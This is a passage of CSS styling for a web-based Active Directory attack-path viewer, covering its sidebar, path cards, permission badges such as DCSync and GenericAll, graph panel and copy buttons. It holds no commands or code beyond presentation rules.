.badge.warn{background:rgba(255,34,68,.1);color:var(--red);border-color:rgba(255,34,68,.3)}
.dropzone{border:2px dashed var(--border2);border-radius:7px;padding:18px 10px;text-align:center;cursor:pointer;transition:all .25s;background:rgba(0,212,255,.02)}
.dropzone:hover,.dropzone.drag-over{border-color:var(--cyan);background:rgba(0,212,255,.06);box-shadow:0 0 18px rgba(0,212,255,.08)}
.dz-icon{font-size:1.6em;margin-bottom:6px}
.dz-text{font-size:0.80em;color:var(--dim2);letter-spacing:1px;line-height:1.7}
.dz-text b{color:var(--cyan);display:block}
.sb-search{width:100%;background:var(--panel2);border:1px solid var(--border2);color:var(--white);padding:5px 10px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:.81em;outline:none;margin-top:8px}
.sb-search:focus{border-color:var(--cyan)}
.sb-help{color:var(--dim);font-size:.72em;line-height:1.55;letter-spacing:.5px;margin:8px 0 8px}
.sb-filters{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
.sb-filter{background:transparent;border:1px solid var(--border2);color:var(--dim2);padding:2px 7px;border-radius:3px;font-family:'Share Tech Mono',monospace;font-size:.70em;cursor:pointer;letter-spacing:.7px;text-transform:uppercase;transition:all .15s}
.sb-filter:hover,.sb-filter.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.06)}
.node-list{flex:1;overflow-y:auto;scrollbar-width:thin;scrollbar-color:var(--border2) transparent}
.ni{display:flex;align-items:center;gap:7px;padding:6px 14px;cursor:pointer;transition:all .15s;border-left:2px solid transparent;font-size:.81em}
.ni:hover{background:rgba(0,212,255,.04)}
.ni.owned{border-left-color:var(--green);background:rgba(0,255,136,.05)}
.ni.owned .ni-label{color:var(--green)}
.ni-ico{font-size:1em;width:16px;text-align:center;flex-shrink:0}
.ni-label{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.ni-type{font-size:.86em;color:var(--dim);letter-spacing:.5px}
.ni-chk{width:13px;height:13px;border:1px solid var(--border2);border-radius:2px;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all .15s;font-size:0.80em}
.ni.owned .ni-chk{background:var(--green);border-color:var(--green);color:#000}
.tag-sm{font-size:0.80em;padding:1px 4px;border-radius:2px;letter-spacing:.5px}
.t-dc{background:rgba(255,34,68,.1);color:var(--red);border:1px solid rgba(255,34,68,.25)}
.t-spn{background:rgba(255,215,0,.08);color:var(--yellow);border:1px solid rgba(255,215,0,.2)}
.t-t2a4d{background:rgba(255,107,43,.08);color:var(--orange);border:1px solid rgba(255,107,43,.2)}
.t-asrep{background:rgba(187,134,252,.08);color:var(--purple);border:1px solid rgba(187,134,252,.2)}
.t-gmsa{background:rgba(255,215,0,.08);color:var(--yellow);border:1px solid rgba(255,215,0,.2)}
@keyframes pulseRed{0%,100%{box-shadow:0 0 6px rgba(255,34,68,.15)}50%{box-shadow:0 0 18px rgba(255,34,68,.45)}}
.ni.is-dc{animation:pulseRed 3s ease-in-out infinite}
main{display:flex;flex-direction:column;overflow:hidden}
.tabs{display:flex;gap:2px;padding:8px 20px 0;border-bottom:1px solid var(--border);background:var(--panel)}
.tab{padding:7px 14px;font-family:'Share Tech Mono',monospace;font-size:0.80em;letter-spacing:2px;text-transform:uppercase;color:var(--dim2);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;background:none;border-top:none;border-left:none;border-right:none}
.tab:hover{color:var(--cyan)}
.tab.active{color:var(--cyan);border-bottom-color:var(--cyan)}
.tab-spacer{flex:1}
.object-search{display:flex;align-items:center;gap:6px;margin-left:auto;padding-bottom:6px}
.object-search.hidden{display:none}
.object-search input{width:240px;background:var(--panel2);border:1px solid var(--border2);color:var(--white);padding:5px 10px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:.78em;outline:none}
.object-search input:focus{border-color:var(--cyan)}
.object-search button{background:transparent;border:1px solid var(--border2);color:var(--dim2);padding:4px 8px;border-radius:3px;font-family:'Share Tech Mono',monospace;font-size:.74em;cursor:pointer}
.object-search button:hover{border-color:var(--cyan);color:var(--cyan)}
.content{flex:1;overflow-y:auto;padding:18px 20px;scrollbar-width:thin;scrollbar-color:var(--border2) transparent}
.welcome{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;min-height:300px;gap:14px;text-align:center}
.w-icon{font-size:2.8em;opacity:.35}
.w-title{font-family:'Orbitron',monospace;font-size:.85em;color:var(--dim2);letter-spacing:3px}
.w-sub{font-size:0.80em;color:var(--dim);letter-spacing:1px;line-height:2}
.stat-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:9px;margin-bottom:18px}
.sc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:11px 8px;text-align:center}
.sc.clickable{cursor:pointer;transition:border-color .15s,background .15s,transform .15s}
.sc.clickable:hover,.sc.active{border-color:var(--cyan);background:rgba(0,212,255,.06)}
.sc.clickable:hover{transform:translateY(-1px)}
.sc-n{font-family:'Orbitron',monospace;font-size:1.5em;font-weight:900;color:var(--cyan);display:block}
.sc-n.warn{color:var(--red)} .sc-n.ok{color:var(--green)} .sc-n.paths{color:var(--orange)}
.sc-l{font-size:0.80em;color:var(--dim2);letter-spacing:1px;text-transform:uppercase;margin-top:3px}
.ov-empty{color:var(--dim2);text-align:center;padding:18px;border:1px dashed var(--border);border-radius:5px;font-size:.82em}
.ov-name{color:var(--cyan);font-family:'Share Tech Mono',monospace}
.ov-tags{display:flex;gap:4px;flex-wrap:wrap}
.ov-graph{display:flex;gap:4px;flex-wrap:wrap}
.ov-g{font-size:.76em;padding:1px 5px;border-radius:2px;border:1px solid var(--border2);color:var(--dim2);white-space:nowrap}
.ov-g.vis{color:var(--green);border-color:rgba(0,255,136,.35);background:rgba(0,255,136,.07)}
.ov-g.bucket{color:var(--yellow);border-color:rgba(255,215,0,.35);background:rgba(255,215,0,.07)}
.ov-g.disc{color:var(--dim);border-color:var(--border);background:rgba(255,255,255,.02)}
.ov-g.acl{color:var(--red);border-color:rgba(255,34,68,.35);background:rgba(255,34,68,.06)}
.ov-g.struct{color:var(--cyan);border-color:rgba(0,212,255,.35);background:rgba(0,212,255,.06)}
.ov-g.member{color:var(--purple);border-color:rgba(187,134,252,.35);background:rgba(187,134,252,.06)}
.ov-g.path{color:var(--orange);border-color:rgba(255,107,43,.35);background:rgba(255,107,43,.06)}
.sec{margin-bottom:22px}
.sec-title{font-family:'Orbitron',monospace;font-size:0.80em;letter-spacing:3px;color:var(--dim2);text-transform:uppercase;padding-bottom:7px;margin-bottom:11px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
.sec-title .cnt{background:rgba(0,212,255,.1);color:var(--cyan);border:1px solid rgba(0,212,255,.3);padding:1px 8px;border-radius:3px;font-size:.9em}
.sec-title .cnt.warn{background:rgba(255,34,68,.1);color:var(--red);border-color:rgba(255,34,68,.3)}
.path-filters{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--border);align-items:center}
.psearch{background:var(--panel2);border:1px solid var(--border2);color:var(--white);padding:4px 10px;border-radius:3px;font-family:'Share Tech Mono',monospace;font-size:0.80em;outline:none;width:180px}
.psearch:focus{border-color:var(--cyan)}
.fbtn{background:transparent;border:1px solid var(--border2);color:var(--dim2);padding:3px 10px;border-radius:3px;font-family:'Share Tech Mono',monospace;font-size:0.80em;cursor:pointer;letter-spacing:1px;text-transform:uppercase;transition:all .15s}
.fbtn:hover,.fbtn.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.06)}
.path-card{background:var(--panel);border:1px solid var(--border);border-left:3px solid transparent;border-radius:5px;margin-bottom:7px;cursor:pointer;transition:all .2s}
.path-card:hover{background:var(--panel2)}
.path-card[data-sev="1"]{border-left-color:var(--red)}
.path-card[data-sev="2"]{border-left-color:var(--red)}
.path-card[data-sev="3"]{border-left-color:var(--orange)}
.path-card[data-sev="4"]{border-left-color:var(--orange)}
.path-card[data-sev="5"]{border-left-color:var(--yellow)}
.path-card[data-sev="6"]{border-left-color:var(--yellow)}
.path-card[data-sev="7"]{border-left-color:var(--cyan)}
.ph{display:flex;align-items:center;gap:7px;padding:9px 13px;font-size:.81em;flex-wrap:wrap}
.ph-from{color:var(--green);font-family:'Orbitron',monospace;font-size:.9em}
.ph-arr{color:var(--dim)}
.ph-to{color:var(--cyan);font-family:'Orbitron',monospace;font-size:.9em}
.ph-via{color:var(--dim2);font-size:.8em}
.ph-dep{margin-left:auto;color:var(--dim);font-size:.8em}
.ph-inh{color:var(--dim);font-size:.86em;background:rgba(58,96,112,.2);padding:1px 5px;border-radius:2px}
.rp{padding:2px 8px;border-radius:3px;font-size:.82em;font-weight:bold;letter-spacing:.5px}
.rp-GenericAll,.rp-DCSync,.rp-GetChanges,.rp-GetChangesAll,.rp-GetChangesInFilteredSet{background:rgba(255,34,68,.13);color:var(--red);border:1px solid rgba(255,34,68,.35)}
.rp-WriteDacl,.rp-WriteOwner,.rp-Owns,.rp-AllExtendedRights{background:rgba(255,107,43,.13);color:var(--orange);border:1px solid rgba(255,107,43,.35)}
.rp-ForceChangePassword,.rp-AddMember{background:rgba(187,134,252,.12);color:var(--purple);border:1px solid rgba(187,134,252,.35)}
.rp-GenericWrite,.rp-WriteSPN,.rp-WriteGPLink{background:rgba(255,215,0,.1);color:var(--yellow);border:1px solid rgba(255,215,0,.35)}
.rp-ReadGMSAPassword,.rp-SyncLAPSPassword{background:rgba(0,255,136,.09);color:var(--green);border:1px solid rgba(0,255,136,.35)}
.rp-WriteAccountRestrictions,.rp-AddAllowedToAct,.rp-AllowedToAct{background:rgba(255,107,43,.11);color:var(--orange);border:1px solid rgba(255,107,43,.32)}
.rp-AddKeyCredentialLink{background:rgba(41,121,255,.1);color:#82b1ff;border:1px solid rgba(41,121,255,.35)}
.rp-default{background:rgba(90,128,144,.1);color:var(--dim2);border:1px solid rgba(90,128,144,.25)}
.pchain{display:none;padding:0 13px 11px;border-top:1px solid var(--border)}
.path-card.expanded .pchain{display:block}
.chain-steps{padding-top:9px;display:flex;flex-direction:column;gap:0}
.cs{display:flex;align-items:center;gap:7px;font-size:0.80em;padding:2px 0}
.cs-node{background:var(--panel2);border:1px solid var(--border2);border-radius:3px;padding:2px 9px;color:var(--white);font-family:'Orbitron',monospace;font-size:.9em}
.cs-node.owned{border-color:var(--green);color:var(--green)}
.chain-tip{font-size:0.80em;color:var(--dim2);margin-top:9px;padding-top:7px;border-top:1px solid var(--border);line-height:1.8}
.chain-tip b{color:var(--yellow)}
.chain-tip pre{background:#050c12;border:1px solid var(--border2);border-radius:4px;padding:9px 11px;margin:7px 0 3px;color:var(--green);font-family:'Share Tech Mono',monospace;font-size:1em;white-space:pre-wrap;word-break:break-all;line-height:1.65}
.pre-wrap{position:relative;margin:7px 0 3px}
.pre-wrap pre{margin:0}
.copy-btn{position:absolute;top:5px;right:6px;background:rgba(0,212,255,.07);border:1px solid rgba(0,212,255,.25);color:var(--dim2);padding:2px 8px;border-radius:3px;font-family:'Share Tech Mono',monospace;font-size:.86em;cursor:pointer;letter-spacing:1px;transition:all .2s;line-height:1.6;z-index:2}
.copy-btn:hover{background:rgba(0,212,255,.15);border-color:var(--cyan);color:var(--cyan)}
.copy-btn.copied{background:rgba(0,255,136,.1);border-color:var(--green);color:var(--green)}
@keyframes flashGreen{0%,100%{opacity:1}50%{opacity:.6}}
.chain-tip .tip-label{color:var(--cyan);font-family:'Orbitron',monospace;font-size:.88em;letter-spacing:2px;margin-bottom:4px;display:block}
.chain-tip .tip-src a{color:var(--dim);font-size:.85em;text-decoration:none}
.chain-tip .tip-src a:hover{color:var(--cyan)}
.no-paths{text-align:center;padding:36px 20px;color:var(--dim2);font-size:.81em;letter-spacing:1px;line-height:2}
.acl-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:.81em}
th{text-align:left;padding:6px 9px;color:var(--dim2);font-weight:normal;letter-spacing:1px;text-transform:uppercase;border-bottom:1px solid var(--border);white-space:nowrap;font-size:.9em}
td{padding:5px 9px;border-bottom:1px solid rgba(26,48,69,.35);white-space:nowrap}
tr:hover td{background:rgba(0,212,255,.02)}
.tc-p{color:var(--cyan)} .tc-t{color:var(--green)} .tc-dim{color:var(--dim2)}
.tc-inh-y{color:var(--dim)} .tc-inh-n{color:var(--yellow)}
.deleg-grid{display:grid;grid-template-columns:1fr 1fr;gap:11px}
.dbox{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:11px}
.dbox h4{font-family:'Orbitron',monospace;font-size:0.80em;color:var(--cyan);letter-spacing:2px;margin-bottom:8px;text-transform:uppercase}
.drow{display:flex;gap:7px;padding:4px 0;border-bottom:1px solid rgba(26,48,69,.35);font-size:0.80em}
.drow:last-child{border-bottom:none}
.dr-who{color:var(--cyan);flex:1} .dr-spn{color:var(--yellow);flex:2} .dr-type{color:var(--dim2)}
.pre2k-list{display:flex;flex-wrap:wrap;gap:6px;margin-top:14px}
.pre2k-pill{background:rgba(255,215,0,.07);border:1px solid rgba(255,215,0,.25);color:var(--yellow);padding:3px 10px;border-radius:3px;font-size:0.80em}
.loading{display:flex;align-items:center;gap:10px;font-size:.86em;color:var(--cyan);padding:20px}
.spinner{width:14px;height:14px;border:2px solid var(--border2);border-top-color:var(--cyan);border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.hidden{display:none!important}

/* ── SETTINGS PANEL ─────────────────────────────────────────────────────── */
.cfg-btn{background:transparent;border:1px solid var(--border2);color:var(--dim2);padding:4px 12px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:0.80em;cursor:pointer;letter-spacing:2px;transition:all .2s}
.cfg-btn:hover,.cfg-btn.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.06)}
.cfg-overlay{position:fixed;inset:0;background:rgba(4,8,14,.82);z-index:9000;display:flex;align-items:flex-start;justify-content:flex-end;padding:60px 20px 0}
.cfg-panel{background:var(--panel);border:1px solid var(--border2);border-radius:8px;width:440px;max-height:80vh;overflow-y:auto;box-shadow:0 0 40px rgba(0,212,255,.1);animation:slideIn .2s ease}
@keyframes slideIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
.cfg-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border)}
.cfg-title{font-family:'Orbitron',monospace;font-size:.81em;color:var(--cyan);letter-spacing:3px}
.cfg-close{background:none;border:none;color:var(--dim2);font-size:1.2em;cursor:pointer;padding:0 4px;line-height:1}
.cfg-close:hover{color:var(--red)}
.cfg-body{padding:16px 18px;display:flex;flex-direction:column;gap:12px}
.cfg-section{border-bottom:1px solid var(--border);padding-bottom:12px;margin-bottom:4px}
.cfg-section-title{font-family:'Orbitron',monospace;font-size:.81em;color:var(--dim2);letter-spacing:3px;text-transform:uppercase;margin-bottom:9px}
.cfg-row{display:flex;flex-direction:column;gap:4px}
.cfg-label{font-size:0.80em;color:var(--dim2);letter-spacing:1px}
.cfg-label span{color:var(--cyan);font-family:'Share Tech Mono',monospace;margin-left:6px;opacity:.7}
.cfg-input{background:var(--panel2);border:1px solid var(--border2);color:var(--white);padding:6px 10px;border-radius:4px;font-family:'Share Tech Mono',monospace;font-size:.81em;outline:none;width:100%;transition:border-color .15s}
.cfg-input:focus{border-color:var(--cyan)}
.cfg-input::placeholder{color:var(--dim)}
.cfg-hint{font-size:0.80em;color:var(--dim);line-height:1.5;margin-top:2px}
.cfg-apply{width:100%;background:rgba(0,212,255,.08);border:1px solid var(--cyan);color:var(--cyan);padding:8px;border-radius:4px;font-family:'Orbitron',monospace;font-size:0.80em;letter-spacing:3px;cursor:pointer;transition:all .2s;margin-top:6px}
.cfg-apply:hover{background:rgba(0,212,255,.16)}
.cfg-indicator{width:7px;height:7px;border-radius:50%;background:var(--dim);display:inline-block;margin-right:6px;transition:background .3s}
.cfg-indicator.set{background:var(--green);box-shadow:0 0 6px rgba(0,255,136,.5)}
/* highlight placeholders in pre blocks */
.cfg-ph{color:var(--orange);font-weight:bold;background:rgba(255,107,43,.08);border-radius:2px;padding:0 2px}

/* ── GRAPH TAB ─────────────────────────────────────────────────────────── */
#graphView { background: var(--bg); }
#graphView svg { position:absolute; inset:0; width:100%; height:100%; }

/* graph toolbar */
.g-toolbar {
  position:absolute; top:10px; left:50%; transform:translateX(-50%);
  display:flex; gap:6px; z-index:50;
  background:rgba(8,15,24,.88); border:1px solid var(--border2);
  border-radius:6px; padding:5px 8px; backdrop-filter:blur(6px);
}
.g-btn {
  background:transparent; border:1px solid var(--border2);
  color:var(--dim2); padding:3px 10px; border-radius:3px;
  font-family:'Share Tech Mono',monospace; font-size:0.80em;
  cursor:pointer; letter-spacing:1px; transition:all .15s;
}
.g-btn:hover,.g-btn.active { border-color:var(--cyan); color:var(--cyan); background:rgba(0,212,255,.07); }
.g-btn.danger { border-color:rgba(255,34,68,.3); color:var(--red); }
.g-btn.danger:hover { background:rgba(255,34,68,.08); }
.g-filter-panel {
  position:absolute; top:52px; left:50%; transform:translateX(-50%);
  z-index:51; display:flex; flex-wrap:wrap; gap:5px; max-width:min(760px,calc(100% - 320px));
  background:rgba(8,15,24,.92); border:1px solid var(--border2);
  border-radius:6px; padding:7px 9px; backdrop-filter:blur(6px);
}
.g-filter-panel.hidden { display:none; }
.g-filter-btn {
  background:transparent; border:1px solid var(--border2); color:var(--dim);
  padding:3px 8px; border-radius:3px; font-family:'Share Tech Mono',monospace;
  font-size:.72em; cursor:pointer; letter-spacing:.7px; transition:all .15s;
}
.g-filter-btn.active { border-color:var(--cyan); color:var(--cyan); background:rgba(0,212,255,.07); }
.g-filter-btn:hover { border-color:var(--cyan); color:var(--cyan); }

/* graph legend */
.g-legend {
  position:absolute; bottom:14px; left:14px; z-index:50;
  background:rgba(8,15,24,.88); border:1px solid var(--border2);
  border-radius:6px; padding:10px 14px;
  backdrop-filter:blur(6px);
  display:flex; flex-direction:column; gap:4px;
}
.g-legend-title { font-family:'Orbitron',monospace; font-size:0.80em; color:var(--dim2); letter-spacing:3px; margin-bottom:2px; }
.g-legend-row { display:flex; align-items:center; gap:7px; font-size:.87em; color:var(--dim2); }
.g-dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; }
.g-line { width:20px; height:2px; flex-shrink:0; }
.g-sep { border-top:1px solid var(--border); margin:4px 0; }

/* graph info panel */
.g-info {
  position:absolute; top:10px; right:10px; width:280px; z-index:50;
  background:rgba(8,15,24,.92); border:1px solid var(--border2);
  border-radius:7px; overflow:hidden; backdrop-filter:blur(8px);
  max-height:calc(100% - 20px); display:flex; flex-direction:column;
  transition:opacity .2s, transform .2s;
}
.g-info.hidden { opacity:0; pointer-events:none; transform:translateX(8px); }
.g-info-hdr { padding:10px 13px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:8px; }
.g-info-icon { font-size:1.1em; }
.g-info-name { font-family:'Orbitron',monospace; font-size:0.80em; color:var(--cyan); letter-spacing:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.g-info-type { font-size:.81em; color:var(--dim2); margin-top:1px; }
.g-info-body { padding:9px 13px; display:flex; flex-direction:column; gap:5px; }
.g-info-row { display:flex; justify-content:space-between; font-size:0.80em; }
.g-info-edges { padding:0 13px 10px; display:flex; flex-direction:column; gap:3px; flex:1 1 auto; overflow-y:auto; min-height:0; scrollbar-width:thin; scrollbar-color:var(--border2) transparent; }
.g-edge-row { display:flex; align-items:center; gap:5px; font-size:.87em; padding:2px 5px; border-radius:3px; border:1px solid var(--border); }
.g-edge-row.clickable { cursor:pointer; transition:border-color .15s, background .15s; }
.g-edge-row.clickable:hover { border-color:var(--cyan); background:rgba(0,212,255,.06); }
.g-badge { padding:1px 5px; border-radius:2px; font-weight:bold; font-size:.85em; white-space:nowrap; }
.g-edge-section { margin-top:5px; display:flex; flex-direction:column; gap:3px; }
.g-edge-title { font-family:'Orbitron',monospace; color:var(--dim2); font-size:.70em; letter-spacing:2px; padding:4px 1px 1px; text-transform:uppercase; }
.g-edge-empty { color:var(--dim); font-size:.78em; padding:4px 6px; border:1px dashed var(--border); border-radius:3px; }
.g-edge-name { color:var(--dim2); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.g-edge-meta { color:var(--dim); font-size:.80em; white-space:nowrap; }
.g-edge-more { align-self:flex-end; background:transparent; border:0; color:var(--cyan); cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:.72em; padding:2px 3px; }
.g-edge-more:hover { text-decoration:underline; }
.g-owned-action {
  width:100%; background:rgba(0,255,136,.06); border:1px solid rgba(0,255,136,.28);
  color:var(--green); border-radius:4px; padding:5px 8px; margin-top:4px;
  font-family:'Share Tech Mono',monospace; font-size:.76em; cursor:pointer; letter-spacing:.7px;
}
.g-owned-action.remove { background:rgba(255,34,68,.06); border-color:rgba(255,34,68,.28); color:var(--red); }
.g-owned-action:hover { border-color:currentColor; background:rgba(0,212,255,.08); }
.g-owned-note { color:var(--dim); font-size:.72em; line-height:1.45; padding-top:2px; }

/* graph path bar */
.g-pathbar {
  position:absolute; bottom:14px; right:14px; max-width:420px; z-index:50;
  background:rgba(8,15,24,.92); border:1px solid var(--border2);
  border-radius:6px; padding:8px 13px;
  font-size:0.80em; color:var(--dim2);
  backdrop-filter:blur(6px); display:none;
}
.g-pathbar b { color:var(--cyan); font-family:'Orbitron',monospace; font-size:.88em; letter-spacing:2px; display:block; margin-bottom:4px; }
.g-pchain { display:flex; align-items:center; flex-wrap:wrap; gap:3px; }
.g-pn { color:var(--green); background:rgba(0,255,136,.07); border:1px solid rgba(0,255,136,.25); padding:1px 6px; border-radius:3px; }
.g-pr { color:var(--yellow); font-size:.85em; }
.g-pa { color:var(--dim); }

/* graph zoom controls */
.g-zoom { position:absolute; bottom:14px; left:50%; transform:translateX(-50%); display:flex; gap:6px; z-index:50; }

/* ── GRAPH TAB ─────────────────────────────────────────────────────────── */
#graphView { background: var(--bg); }
#graphView svg { position:absolute; inset:0; width:100%; height:100%; }

/* graph toolbar */
.g-toolbar {
  position:absolute; top:10px; left:50%; transform:translateX(-50%);
  display:flex; gap:6px; z-index:50;
  background:rgba(8,15,24,.88); border:1px solid var(--border2);
  border-radius:6px; padding:5px 8px; backdrop-filter:blur(6px);
}
.g-btn {
  background:transparent; border:1px solid var(--border2);
  color:var(--dim2); padding:3px 10px; border-radius:3px;
  font-family:'Share Tech Mono',monospace; font-size:0.80em;
  cursor:pointer; letter-spacing:1px; transition:all .15s;
}
.g-btn:hover,.g-btn.active { border-color:var(--cyan); color:var(--cyan); background:rgba(0,212,255,.07); }
.g-btn.danger { border-color:rgba(255,34,68,.3); color:var(--red); }
.g-btn.danger:hover { background:rgba(255,34,68,.08); }
.g-filter-panel {
  position:absolute; top:52px; left:50%; transform:translateX(-50%);
  z-index:51; display:flex; flex-wrap:wrap; gap:5px; max-width:min(760px,calc(100% - 320px));
  background:rgba(8,15,24,.92); border:1px solid var(--border2);
  border-radius:6px; padding:7px 9px; backdrop-filter:blur(6px);
}
.g-filter-panel.hidden { display:none; }
.g-filter-btn {
  background:transparent; border:1px solid var(--border2); color:var(--dim);
  padding:3px 8px; border-radius:3px; font-family:'Share Tech Mono',monospace;
  font-size:.72em; cursor:pointer; letter-spacing:.7px; transition:all .15s;
}
.g-filter-btn.active { border-color:var(--cyan); color:var(--cyan); background:rgba(0,212,255,.07); }
.g-filter-btn:hover { border-color:var(--cyan); color:var(--cyan); }

/* graph legend */
.g-legend {
  position:absolute; bottom:14px; left:14px; z-index:50;
  background:rgba(8,15,24,.88); border:1px solid var(--border2);
  border-radius:6px; padding:10px 14px;
  backdrop-filter:blur(6px);
  display:flex; flex-direction:column; gap:4px;
}
.g-legend-title { font-family:'Orbitron',monospace; font-size:0.80em; color:var(--dim2); letter-spacing:3px; margin-bottom:2px; }
.g-legend-row { display:flex; align-items:center; gap:7px; font-size:.87em; color:var(--dim2); }
.g-dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; }
.g-line { width:20px; height:2px; flex-shrink:0; }
.g-sep { border-top:1px solid var(--border); margin:4px 0; }

/* graph info panel */
.g-info {
  position:absolute; top:10px; right:10px; width:280px; z-index:50;
  background:rgba(8,15,24,.92); border:1px solid var(--border2);
  border-radius:7px; overflow:hidden; backdrop-filter:blur(8px);
  max-height:calc(100% - 20px); display:flex; flex-direction:column;
  transition:opacity .2s, transform .2s;
}
.g-info.hidden { opacity:0; pointer-events:none; transform:translateX(8px); }
.g-info-hdr { padding:10px 13px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:8px; }
.g-info-icon { font-size:1.1em; }
.g-info-name { font-family:'Orbitron',monospace; font-size:0.80em; color:var(--cyan); letter-spacing:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.g-info-type { font-size:.81em; color:var(--dim2); margin-top:1px; }
.g-info-body { padding:9px 13px; display:flex; flex-direction:column; gap:5px; }
.g-info-row { display:flex; justify-content:space-between; font-size:0.80em; }
.g-info-edges { padding:0 13px 10px; display:flex; flex-direction:column; gap:3px; flex:1 1 auto; overflow-y:auto; min-height:0; scrollbar-width:thin; scrollbar-color:var(--border2) transparent; }
.g-edge-row { display:flex; align-items:center; gap:5px; font-size:.87em; padding:2px 5px; border-radius:3px; border:1px solid var(--border); }
.g-edge-row.clickable { cursor:pointer; transition:border-color .15s, background .15s; }
.g-edge-row.clickable:hover { border-color:var(--cyan); background:rgba(0,212,255,.06); }
.g-badge { padding:1px 5px; border-radius:2px; font-weight:bold; font-size:.85em; white-space:nowrap; }
.g-edge-section { margin-top:5px; display:flex; flex-direction:column; gap:3px; }
.g-edge-title { font-family:'Orbitron',monospace; color:var(--dim2); font-size:.70em; letter-spacing:2px; padding:4px 1px 1px; text-transform:uppercase; }
.g-edge-empty { color:var(--dim); font-size:.78em; padding:4px 6px; border:1px dashed var(--border); border-radius:3px; }
.g-edge-name { color:var(--dim2); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.g-edge-meta { color:var(--dim); font-size:.80em; white-space:nowrap; }
.g-edge-more { align-self:flex-end; background:transparent; border:0; color:var(--cyan); cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:.72em; padding:2px 3px; }
.g-edge-more:hover { text-decoration:underline; }
.g-owned-action {
  width:100%; background:rgba(0,255,136,.06); border:1px solid rgba(0,255,136,.28);
  color:var(--green); border-radius:4px; padding:5px 8px; margin-top:4px;
  font-family:'Share Tech Mono',monospace; font-size:.76em; cursor:pointer; letter-spacing:.7px;
}
.g-owned-action.remove { background:rgba(255,34,68,.06); border-color:rgba(255,34,68,.28); color:var(--red); }
.g-owned-action:hover { border-color:currentColor; background:rgba(0,212,255,.08); }
.g-owned-note { color:var(--dim); font-size:.72em; line-height:1.45; padding-top:2px; }

/* graph path bar */
.g-pathbar {
  position:absolute; bottom:14px; right:14px; max-width:420px; z-index:50;
  background:rgba(8,15,24,.92); border:1px solid var(--border2);
  border-radius:6px; padding:8px 13px;
  font-size:0.80em; color:var(--dim2);
  backdrop-filter:blur(6px); display:none;
}
.g-pathbar b { color:var(--cyan); font-family:'Orbitron',monospace; font-size:.88em; letter-spacing:2px; display:block; margin-bottom:4px; }
.g-pchain { display:flex; align-items:center; flex-wrap:wrap; gap:3px; }
.g-pn { color:var(--green); background:rgba(0,255,136,.07); border:1px solid rgba(0,255,136,.25); padding:1px 6px; border-radius:3px; }
.g-pr { color:var(--yellow); font-size:.85em; }
.g-pa { color:var(--dim); }

/* graph zoom controls */
.g-zoom { position:absolute; bottom:14px; left:50%; transform:translateX(-50%); display:flex; gap:6px; z-index:50; }

/* edge tooltip */
.edge-tip {
  position:fixed; z-index:500;
  background:rgba(5,12,20,.97); border:1px solid var(--border2);
  border-radius:6px; padding:0; min-width:220px; max-width:340px;
  box-shadow:0 4px 24px rgba(0,0,0,.5);
  pointer-events:none; opacity:0;
  transition:opacity .15s;
  font-family:'Share Tech Mono',monospace;
}
.edge-tip.show { opacity:1; pointer-events:auto; }
.edge-tip-hdr {
  display:flex; align-items:center; justify-content:space-between;
  padding:7px 10px; border-bottom:1px solid var(--border);
}
.edge-tip-right { font-weight:bold; font-size:.86em; letter-spacing:.5px; padding:2px 8px; border-radius:3px; }
.edge-tip-copy {
  background:rgba(0,212,255,.08); border:1px solid rgba(0,212,255,.3);
  color:var(--cyan); padding:2px 8px; border-radius:3px;
  font-family:'Share Tech Mono',monospace; font-size:0.80em;
  cursor:pointer; transition:all .15s; letter-spacing:1px;
  pointer-events:auto;
}
.edge-tip-copy:hover { background:rgba(0,212,255,.18); }
.edge-tip-copy.copied { border-color:var(--green); color:var(--green); background:rgba(0,255,136,.1); }
.edge-tip-body {
  padding:8px 10px; font-size:0.80em; color:var(--dim2);
  line-height:1.75; max-height:220px; overflow-y:auto;
  scrollbar-width:thin; scrollbar-color:var(--border2) transparent;
}
.edge-tip-body pre {
  background:#030810; border:1px solid var(--border2); border-radius:3px;
  padding:6px 8px; color:var(--green); font-family:'Share Tech Mono',monospace;
  font-size:.95em; white-space:pre-wrap; word-break:break-all;
  line-height:1.6; margin:4px 0 2px;
}
.edge-tip-label { color:var(--cyan); font-size:.85em; letter-spacing:1px; display:block; margin-bottom:3px; }
.edge-tip-src a { color:var(--dim); font-size:.85em; text-decoration:none; }
.edge-tip-src a:hover { color:var(--cyan); }
/* per-block copy */
.et-block { position:relative; margin:4px 0 2px; }
.et-block-copy {
  position:absolute; top:4px; right:5px;
  background:rgba(0,212,255,.07); border:1px solid rgba(0,212,255,.25);
  color:var(--dim2); padding:1px 6px; border-radius:3px;
  font-family:'Share Tech Mono',monospace; font-size:.81em;
  cursor:pointer; transition:all .15s; z-index:2; line-height:1.6;
  pointer-events:auto;
}
